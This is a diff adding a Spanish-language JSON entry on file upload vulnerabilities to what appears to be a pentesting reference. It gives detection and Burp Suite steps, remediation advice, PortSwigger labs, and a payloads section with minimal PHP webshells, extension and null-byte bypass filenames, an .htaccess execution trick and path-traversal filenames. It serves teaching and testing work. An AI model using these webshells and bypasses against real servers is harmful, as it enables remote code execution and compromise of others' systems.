@@ -1,0 +1,59 @@
+{
+  "id": "file-upload",
+  "name": "File Upload Vulnerabilities",
+  "category": "Server-side",
+  "severity": "High",
+  "aka": ["Unrestricted file upload", "Webshell"],
+  "summary": "La aplicación permite subir archivos sin validar correctamente tipo, contenido o ubicación, pudiendo llevar a ejecución de código (webshell) u otras vulnerabilidades.",
+  "where_to_look": [
+    "Avatares, adjuntos, importadores y cualquier formulario multipart/form-data.",
+    "Validación basada solo en Content-Type o en la extensión del nombre."
+  ],
+  "detection": [
+    "Sube un archivo de servidor (.php/.jsp) y comprueba si se ejecuta al accederlo.",
+    "Comprueba dónde se guarda y si es accesible por URL.",
+    "Prueba a saltar filtros de extensión/Content-Type y carga de .htaccess."
+  ],
+  "burp_steps": [
+    "Captura la subida en Repeater y modifica filename y Content-Type.",
+    "Sube una webshell mínima y accede a su URL para confirmar ejecución.",
+    "Si filtra la extensión, prueba dobles extensiones, mayúsculas o variantes (.phtml, .php5).",
+    "Si valida Content-Type, cámbialo a image/jpeg manteniendo contenido PHP.",
+    "Combina con path traversal en el filename para escribir fuera del directorio previsto.",
+    "Sube un .htaccess para forzar que una extensión se interprete como PHP."
+  ],
+  "payloads": {
+    "Webshell PHP mínima": [
+      "<?php echo system($_GET['cmd']); ?>",
+      "<?php system($_REQUEST['c']); ?>"
+    ],
+    "Bypass de extensión": [
+      "shell.php  → shell.phtml / shell.php5 / shell.pHp",
+      "shell.php.jpg",
+      "shell.jpg.php",
+      "shell.php%00.jpg"
+    ],
+    "Bypass por .htaccess": [
+      "AddType application/x-httpd-php .l33t"
+    ],
+    "Path traversal en filename": [
+      "../shell.php",
+      "..%2fshell.php"
+    ]
+  },
+  "commands": [],
+  "remediation": [
+    "Valida el contenido real del archivo, no solo la extensión/Content-Type.",
+    "Guarda los archivos fuera del webroot y sírvelos por un handler controlado.",
+    "Renombra a un identificador generado y deshabilita la ejecución en el directorio de uploads."
+  ],
+  "portswigger_labs": [
+    {"title": "Webshell vía subida sin restricciones", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload"},
+    {"title": "Bypass de validación de Content-Type", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass"},
+    {"title": "Subida de .htaccess para ejecutar", "difficulty": "PRACTITIONER", "url": "https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass"}
+  ],
+  "references": [
+    {"title": "PortSwigger — File upload vulnerabilities", "url": "https://portswigger.net/web-security/file-upload"},
+    {"title": "OWASP — Unrestricted File Upload", "url": "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"}
+  ]
+}
